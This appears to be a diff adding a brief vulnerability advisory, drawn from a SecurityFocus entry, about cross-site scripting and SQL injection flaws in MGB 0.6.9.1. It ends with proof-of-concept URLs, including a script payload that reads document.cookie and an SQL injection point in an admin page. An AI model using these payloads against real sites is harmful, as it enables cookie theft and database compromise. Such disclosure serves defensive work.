@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/54348/info
+
+MGB is prone to multiple cross-site scripting vulnerabilities and an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+MGB 0.6.9.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/mgb/admin/admin.php?action=delete&id=[SQLi]&p=1
+
+http://www.example.com/mgb/index.php?p=1â??"</script><script>alert(document.cookie)</script> [XSS]
+
+http://www.example.com/mgb/newentry.php [XSS] 
